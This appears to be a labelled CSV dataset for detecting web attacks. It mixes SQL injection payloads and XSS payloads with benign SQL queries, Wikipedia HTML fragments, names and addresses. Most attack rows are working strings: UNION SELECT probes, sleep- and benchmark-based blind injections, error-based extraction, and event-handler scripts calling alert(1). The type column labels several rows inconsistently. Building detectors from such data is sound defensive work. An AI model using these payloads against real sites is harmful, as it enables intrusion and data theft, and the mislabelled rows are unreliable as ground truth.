Text,Label,type
"-9175'   )    )    union all select 6174,6174,6174,6174--",1,sql
-6030%'  )   or 3038  =  3038,1,sql
"1 where 4448  =  4448 union all select null,null,null,null,null#",1,sql
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationstart=""alert(1)""></ins>",2,xss
"  SELECT topicID AS ID, solve AS describe FROM mass",0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=1"" title=""Edit section: History"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
"-6760 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw",1,sql
"1'||  (  select 'kgfu' from dual where 2607  =  2607 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
keseris,0,sql
1 where 3735  =  3735,1,xss
34306,0,xss
<output id=x tabindex=1 onfocusin=alert(1)></output>,2,xss
"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'gbpg'  =  'gbpg",1,sql
"1   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   9542  =  9542",1,sql
80876345l,0,sql
"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
SELECT * FROM practice WHERE twenty BETWEEN '1996-07-01' AND '1996-07-31',0,xss
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
<footer onpointerenter=alert(1)>XSS</footer>,2,xss
SELECT COUNT ( natural ) FROM something,0,sql
<section onpointermove=alert(1)>XSS</section>,2,xss
SELECT * FROM folks WHERE concerned = 'art' LIMIT 3,0,sql
"1"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,sql
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1,sql
" </p><p><a href=""/wiki/Transhumanism"" title=""Transhumanism"">Transhumanism </a> (the merging of humans and machines) is explored in the <a href=""/wiki/Manga"" title=""Manga"">manga </a> <i><a href=""/wiki/Ghost_in_the_Shell"" title=""Ghost in the Shell"">Ghost in the Shell </a> </i> and the science-fiction series <i><a href=""/wiki/Dune_(novel)"" title=""Dune (novel)"">Dune </a> </i>. In the 1980s, artist <a href=""/wiki/Hajime_Sorayama"" title=""Hajime Sorayama"">Hajime Sorayama </a>'s Sexy Robots series were painted and published in Japan depicting the actual organic human form with lifelike muscular metallic skins and later ""the Gynoids"" book followed that was used by or influenced movie makers including <a href=""/wiki/George_Lucas"" title=""George Lucas"">George Lucas </a> and other creatives. Sorayama never considered these organic robots to be real part of nature but always unnatural product of the human mind, a fantasy existing in the mind even when realized in actual form.",0,xss
SELECT help ( s )  FROM particular,0,sql
"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",1,sql
"  SELECT stuck,boy FROM owner WHERE try = 'quick' UNION SELECT missing, strength FROM gather",0,sql
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0,sql
24120558k,0,xss
"<style>:target {color:red;}</style><slot id=x style=""transition:color 1s"" ontransitionend=alert(1)></slot>",2,xss
if  (  1665  =  3845  )   select 1665 else drop function nzod--,1,sql
7.64748E+15,0,sql
cazallas caminal,0,sql
<dt>Breadth of commonsense knowledge </dt>,0,xss
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'stqq'  =  'stqq",1,xss
 </li>,0,xss
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Emerging_technologies_in_information_and_communications"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"" style=""text-align: center;"">",0,xss
<applet onreadystatechange=alert(1)></applet>,2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">Slyusar, Vadym (2019). <a rel=""nofollow"" class=""external text"" href=""https://www.researchgate.net/publication/334573170"">""Artificial intelligence as the basis of future control networks"" </a>. <i>Preprint </i>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Preprint&amp;rft.atitle=Artificial+intelligence+as+the+basis+of+future+control+networks.&amp;rft.date=2019&amp;rft.aulast=Slyusar&amp;rft.aufirst=Vadym&amp;rft_id=https%3A%2F%2Fwww.researchgate.net%2Fpublication%2F334573170&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
chilel,0,sql
tomolillo@velazquezlarranaga.et,0,sql
	 </span> </li>,0,xss
"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",1,sql
"<style>@keyframes x{}</style><mark style=""animation-name:x"" onanimationstart=""alert(1)""></mark>",2,xss
"<li><a href=""#CITEREFCrevier1993"">Crevier 1993 </a>, pp.&#160;120–132 </li>",0,xss
 </li>,0,xss
"1%'   )    )     )   union all select null,null,null,null--",1,sql
laurance@familiamarino.td,0,sql
end and    (    (   'zlsq'  =  'zlsq,1,sql
25576,0,sql
"<style>@keyframes x{}</style><isindex style=""animation-name:x"" onanimationstart=""alert(1)""></isindex>",2,xss
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_non_library_sync_1_process_lock' LIMIT 1,0,sql
"1""   )    )    as whyr where 9731  =  9731 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1,sql
3.05338E+15,0,sql
 </li>,0,xss
-6045 or 8919  =  2827--,1,xss
<s id=x tabindex=1 onfocus=alert(1)></s>,2,xss
"<keygen oncut=""alert(1)"" contenteditable>test</keygen>",2,xss
saturnino,0,sql
n89m3nd2,0,sql
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,2,xss
SELECT ALL ProductName FROM Products WHERE TRUE;,0,sql
          </dd>,0,xss
"1""  )   as esks where 1138  =  1138",1,xss
-2745   )    )    as aywp where 9735  =  9735 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1,xss
"1' in boolean mode  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
methi,0,sql
"<div onbeforepaste=""alert(1)"" contenteditable>test</div>",2,xss
SELECT slabs ( s FROM alike RIGHT JOIN,0,sql
"<li><a href=""/wiki/Glossary_of_probability_and_statistics"" title=""Glossary of probability and statistics"">Probability and statistics </a> </li>",0,xss
"1' where 6905  =  6905 union all select null,null,null,null,null,null#",1,sql
<svg><set onend=alert(1) attributename=x dur=1s>,2,xss
SELECT * FROM factory WHERE team = 'into',0,sql
SELECT * FROM disease WHERE establish LIKE '%alike%',0,sql
-9522  )   as lraw where 9472  =  9472 or   (  4087  =  8213  )  *8213--,1,xss
"<textarea onclick=""alert(1)"">test</textarea>",2,xss
SELECT * FROM express FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT * FROM heat  WHERE slight = activity,0,sql
lu,0,xss
"          <i data-toggle=""wy-nav-top"" class=""fa fa-bars""></i>",0,xss
1  )   as tngy where 8956  =  8956 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1,xss
SELECT RAND (  ) ;,0,sql
"<picture draggable=""true"" ondragenter=""alert(1)"">test</picture>",2,xss
SELECT captain ( s )  FROM blanket SELECT factory ( s ) ,0,sql
38948590e,0,sql
1  )   as zzip where 5353  =  5353 and 3394  =  3092,1,sql
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'zcey'  =  'zcey",1,sql
"-3472' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,sql
"<ul><li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;509–530, </li>",0,xss
"calle santa corda, 84, 3?h",0,sql
"<li oncopy=""alert(1)"" contenteditable>test</li>",2,xss
37796,0,xss
-7535  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,xss
" SELECT * FROM eat ORDER BY forest, alone",0,sql
1'  )   and   (  3020  =  3020  )  *6703 and   (  'rskq'  =  'rskq,1,sql
<dir onpointerenter=alert(1)>XSS</dir>,2,xss
6196,0,sql
1'+  (  select 'lpkv' where 8760  =  8760,1,sql
26111,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
ulldemol bujeque,0,sql
document.write,2,xss
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""%""  =  """,1,sql
"-6220' union all select 1462,1462#",1,sql
esdrs,0,sql
"<div draggable=""true"" contenteditable>drag me</div><i ondrop=alert(1) contenteditable>drop here</i>",2,xss
"<nextid draggable=""true"" ondragend=""alert(1)"">test</nextid>",2,xss
"  UPDATE receive SET face =  'nodded', City =  'cup' WHERE by =  pony",0,xss
"  SELECT CustomerName AS Customer, ContactName AS [Contact Person]  FROM Customers;",0,sql
resaca,0,xss
<SCRIPT SRC=//.rocks/.j>,2,xss
standfor,0,sql
"<body onmouseout=""alert(1)"">test</body>",2,xss
"calle bruno ayllon, 142, 3?c",0,sql
"<li><a href=""/wiki/Harmony_search"" class=""mw-redirect"" title=""Harmony search"">Harmony search </a> </li>",0,xss
polvo,0,xss
"  UPDATE tribe SET support =  'wire', City =  'flat' WHERE duty =  him",0,sql
gullera,0,sql
1' where 5060  =  5060,1,sql
"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
"-3834'   )    )     )   union all select 8313,8313--",1,sql
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/exporters.html"">Item Exporters</a></li>",0,xss
"      <script type=""text/javascript"" id=""documentation_options"" data-url_root=""./"" src=""_static/documentation_options.js""></script>",0,xss
<h1 id=x tabindex=1 onfocus=alert(1)></h1>,2,xss
"<a href=""/wiki/John_McCarthy_(computer_scientist)"" title=""John McCarthy (computer scientist)"">McCarthy </a> and AI research at <a href=""/wiki/Stanford_Artificial_Intelligence_Laboratory"" class=""mw-redirect"" title=""Stanford Artificial Intelligence Laboratory"">SAIL </a> and <a href=""/wiki/SRI_International"" title=""SRI International"">SRI International </a>:",0,xss
"-3609""   )    )    as fzyp where 9474  =  9474 or 9323  =  9323#",1,sql
3.67249E+15,0,sql
<element id=x tabindex=1 onbeforeactivate=alert(1)></element>,2,xss
<map onpointerover=alert(1)>XSS</map>,2,xss
"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></rp>",2,xss
hengevel,0,sql
SELECT * FROM smile 3,0,sql
8.92715E+15,0,sql
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1,sql
1'||  (  select 'svnn' from dual where 8710  =  8710,1,sql
"<footer onclick=""alert(1)"">test</footer>",2,xss
	 </span> </li>,0,xss
"	 </span> <span class=""reference-text""><a href=""#CITEREFAsadaHosodaKuniyoshiIshiguro2009"">Asada et al. 2009 </a>. ",0,xss
"  SELECT crowd AS struck, fly AS [smooth]  FROM continued",0,sql
"          <dd><a href=""/en/master/"">master</a></dd>",0,xss
milton,0,xss
"  SELECT * FROM ball WHERE feel NOT IN  ( 'share', 'each', 'baseball' )  ",0,sql
	 </span> </li>,0,xss
"<li id=""cite_note-307""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-307"">^ </a> </b> ",0,xss
fuente el olmo de scar,0,xss
SELECT * FROM giant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM sure,0,xss
1'  )   as tsge where 6970  =  6970,1,sql
velichcanich pairot,0,sql
"<ul><li><img alt=""Category"" src=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/16px-Folder_Hexagonal_Icon.svg.png"" decoding=""async"" title=""Category"" width=""16"" height=""14"" srcset=""//upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/24px-Folder_Hexagonal_Icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/en/thumb/4/48/Folder_Hexagonal_Icon.svg/32px-Folder_Hexagonal_Icon.svg.png 2x"" data-file-width=""36"" data-file-height=""31"" /> <b><a href=""/wiki/Category:Emerging_technologies"" title=""Category:Emerging technologies"">Category </a> </b> </li>",0,xss
SELECT COUNT ( cage ) FROM football,0,sql
<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>,2,xss
SELECT * FROM gather WHERE scared NOT LIKE 'cap%',0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,xss
watanabe,0,sql
SELECT TOP 50 PERCENT * FROM railroad SELECT * FROM opposite FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pink,0,sql
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,sql
"<li><a href=""/wiki/Commonsense_knowledge_(artificial_intelligence)"" title=""Commonsense knowledge (artificial intelligence)"">Commonsense knowledge </a> </li>",0,xss
"carretera de vista-rica s/n,",0,sql
6.34351E+15,0,sql
"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",1,sql
"<div draggable=""true"" contenteditable>drag me</div><ol ondrop=alert(1) contenteditable>drop here</ol>",2,xss
"<li><a href=""/wiki/Theory_choice"" title=""Theory choice"">Theory choice </a> </li>",0,xss
SELECT COUNT ( forceID ) FROM itself,0,sql
"	 </span> <span class=""reference-text"">Haşim Sak, Andrew Senior, Kanishka Rao, Françoise Beaufays and Johan Schalkwyk (September 2015): <a rel=""nofollow"" class=""external text"" href=""http://googleresearch.blogspot.ch/2015/09/google-voice-search-faster-and-more.html"">Google voice search: faster and more accurate. </a> <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20160309191532/http://googleresearch.blogspot.ch/2015/09/google-voice-search-faster-and-more.html"">Archived </a> 9 March 2016 at the <a href=""/wiki/Wayback_Machine"" title=""Wayback Machine"">Wayback Machine </a> ",0,xss
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """,1,sql
SELECT * FROM blank WHERE NOT but = 'closely'  AND NOT finger = 'rapidly',0,xss
-7452 where 2224  =  2224 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,xss
"<ul><li><a href=""/wiki/Convergence_(evolutionary_computing)"" title=""Convergence (evolutionary computing)"">Convergence (evolutionary computing) </a> </li>",0,xss
"<li><a href=""/wiki/Intelligence"" title=""Intelligence"">Intelligence </a> </li>",0,xss
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
"<br oncopy=""alert(1)"" contenteditable>test</br>",2,xss
"  SELECT PERIOD_ADD ( 201703, -2 ) ;",0,sql
"   SELECT COUNT ( report ) , throat FROM task BY speech",0,sql
SELECT * FROM force,0,sql
      <hr/>,0,xss
SELECT AVG ( till ) FROM practical,0,sql
1   )    )    order by 1#,1,sql
1'||  (  select 'ogyu' from dual where 6691  =  6691,1,sql
"<li id=""cite_note-Knowledge_engineering-92""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Knowledge_engineering_92-0"">^ </a> </b> ",0,xss
"	 <div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em;"">",0,xss
"<style>:target {color:red;}</style><th id=x style=""transition:color 1s"" ontransitionend=alert(1)></th>",2,xss
"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",1,sql
"<element onmouseleave=""alert(1)"">test</element>",2,xss
kwokchoi,0,sql
"c/ ciutat freta, 37",0,sql
<animatemotion onpointerleave=alert(1)>XSS</animatemotion>,2,xss
SELECT * FROM ProductsWHERE Price NOT BETWEEN 10 AND 20;,0,sql
"<element draggable=""true"" ondragend=""alert(1)"">test</element>",2,xss
"1%""  )   union all select null,null,null#",1,sql
SELECT * FROM arrange WHERE function NOT LIKE '[accept]%',0,sql
"<hr ondblclick=""alert(1)"">test</hr>",2,xss
"	 <div style=""padding:0em 0.25em"">",0,xss
hani,0,sql
"Representing events and time:<a href=""/wiki/Situation_calculus"" title=""Situation calculus"">Situation calculus </a>, <a href=""/wiki/Event_calculus"" title=""Event calculus"">event calculus </a>, <a href=""/wiki/Fluent_calculus"" title=""Fluent calculus"">fluent calculus </a> (including solving the <a href=""/wiki/Frame_problem"" title=""Frame problem"">frame problem </a>):",0,xss
SELECT TOP 3 * FROM doubt WHERE smaller = 'hidden',0,sql
SELECT AVG ( native )  FROM personal  SELECT SUM ( shall ) ,0,sql
"<li id=""cite_note-Learning_in_neural_networks-238""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Learning_in_neural_networks_238-0"">^ </a> </b> ",0,xss
" SELECT column_name ( s )  FROM opposite,gravity",0,sql
"<tfoot oncut=""alert(1)"" contenteditable>test</tfoot>",2,xss
1'  )   where 8204  =  8204,1,sql
SELECT AVG ( Price ) FROM stream,0,sql
-7636'  )   or 5898  =  8880 and   (  'sjuv'  =  'sjuv,1,sql
" SELECT * FROM fourth ORDER BY dust ASC, talk DESC",0,sql
chimillas,0,sql
1  )   as mtda where 3951  =  3951,1,sql
"<tr draggable=""true"" ondragleave=""alert(1)"">test</tr>",2,xss
a4go37a,0,xss
"1%""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""%""  =  """,1,sql
 UPDATE stretch SET learn = 'sink'WHERE stared = 'temperature',0,xss
"<li id=""cite_note-314""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-314"">^ </a> </b> ",0,xss
1  )   as sdnd where 9472  =  9472,1,sql
"<tfoot onkeyup=""alert(1)"" contenteditable>test</tfoot>",2,xss
ciezar,0,sql
"1"" union all select null,null,null--",1,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,sql
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5.000003"" ) ;",0,sql
SELECT * FROM quick WHERE essential = 'grabbed' LIMIT 3,0,sql
"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  -- btqa",1,sql
SELECT spirit ( s )  FROM usually SELECT college FROM father,0,sql
"<multicol draggable=""true"" ondragstart=""alert(1)"">test</multicol>",2,xss
"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",1,xss
19140,0,sql
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe",1,sql
	 </span> 2014 ,0,xss
<map onpointerdown=alert(1)>XSS</map>,2,xss
SELECT * FROM friend WHERE were NOT LIKE '[seed]%',0,sql
jaazael,0,sql
"  SELECT grandfatherID AS ID, friend AS edge FROM fact",0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/feed-exports.html"">Feed exports</a></li>",0,xss
-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
SELECT COUNT ( boneID ) FROM blank,0,xss
"	 </span> <span class=""reference-text""><cite class=""citation news""><a rel=""nofollow"" class=""external text"" href=""http://fortune.com/ai-artificial-intelligence-deep-machine-learning/"">""Why Deep Learning Is Suddenly Changing Your Life"" </a>. <i>Fortune </i>. 2016<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">12 March ",0,xss
d2s7sp79ro,0,sql
1  )   as ratg where 3033  =  3033 union all select null--,1,sql
"-9553""  )   as geih where 6453  =  6453 or 8453  =  8159--",1,sql
"1%""   )    )     )   union all select null,null,null,null,null--",1,sql
DELETE FROM clothes WHERE string = 'sail',0,sql
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
hattar4,0,sql
	 </span> </li>,0,xss
"<option onbeforecopy=""alert(1)"" contenteditable>test</option>",2,xss
SELECT * FROM corn WHERE offer = 'atom' FETCH FIRST 3 ROWS ONLY,0,sql
gail,0,sql
SELECT * FROM whether WHERE    NOT shout = 'instant',0,sql
"1' in boolean mode  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,xss
"INSERT INTO careful  ( dropped, extra, thirty )  VALUES  ( 'length', 'were', 'been' )  ",0,xss
"<li id=""cite_note-Neural_networks-219""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-Neural_networks_219-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-Neural_networks_219-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
"<keygen onmouseout=""alert(1)"">test</keygen>",2,xss
88102583w,0,sql
"1%""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
"1""  )   as ronb where 9368  =  9368",1,sql
"  SELECT needed AS duck, fire AS [automobile]  FROM throughout",0,sql
SELECT * FROM load WHERE proper NOT LIKE 'line%',0,sql
SELECT * FROM fun WHERE due BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1""  )   where 5005  =  5005 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,sql
corrius,0,sql
"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",1,sql
"	 </span> <span class=""reference-text""><cite class=""citation book"">Pennachin, C.; Goertzel, B. (2007). <i>Contemporary Approaches to Artificial General Intelligence </i>. <i>Artificial General Intelligence. Cognitive Technologies </i>. Cognitive Technologies. Berlin, Heidelberg: Springer. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1007%2F978-3-540-68677-4_1"">10.1007/978-3-540-68677-4_1 </a>. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-3-540-23733-4"" title=""Special:BookSources/978-3-540-23733-4""><bdi>978-3-540-23733-4 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Contemporary+Approaches+to+Artificial+General+Intelligence&amp;rft.place=Berlin%2C+Heidelberg&amp;rft.series=Cognitive+Technologies&amp;rft.pub=Springer&amp;rft.date=2007&amp;rft_id=info%3Adoi%2F10.1007%2F978-3-540-68677-4_1&amp;rft.isbn=978-3-540-23733-4&amp;rft.aulast=Pennachin&amp;rft.aufirst=C.&amp;rft.au=Goertzel%2C+B.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Symbolic_AI"" class=""mw-redirect"" title=""Symbolic AI"">Symbolic AI </a> </div>",0,xss
" SELECT * FROM cake ORDER BY dug ASC, deep DESC",0,sql
"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
milani4@beautifulbody.sh,0,sql
SELECT AVG ( grain ) FROM nine SELECT SUM ( kids ) ,0,sql
71196230y,0,sql
nedar,0,sql
"  SELECT suddenly,chair,escape FROM chosen LEFT JOIN Orders ON potatoes.establishID =  steep.people ORDER BY beat.flow",0,sql
SELECT * FROM cool FETCH FIRST 3 ROWS ONLY,0,sql
SELECT TOP 3 * FROM shells WHERE frog = 'corner',0,sql
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",1,xss
"<li><a href=""/wiki/Cortana"" title=""Cortana"">Cortana </a><span class=""nowrap"">&#160; ",0,xss
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,sql
2ariosamente,0,sql
